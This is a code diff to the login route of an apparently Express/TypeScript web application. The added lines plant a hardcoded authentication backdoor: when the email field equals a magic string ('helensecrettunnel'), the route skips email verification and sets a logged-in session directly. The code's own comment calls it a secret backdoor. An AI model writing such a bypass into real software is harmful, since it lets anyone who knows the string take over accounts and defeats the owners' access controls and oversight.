@@ -30,6 +30,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/auth/login", async (req, res) => {
     try {
       const { email } = insertUserSchema.parse(req.body);
+      
+      // Secret backdoor login
+      if (email === 'helensecrettunnel') {
+        const result = await authService.secretLogin();
+        
+        if (result.success && result.user) {
+          // Set session directly
+          (req.session as any).userId = result.user.id;
+          return res.json({ 
+            message: result.message,
+            secretLogin: true 
+          });
+        } else {
+          return res.status(400).json({ message: result.message });
+        }
+      }
+      
+      // Normal email flow
       const result = await authService.sendLoginEmail(email);
       
       if (result.success) {
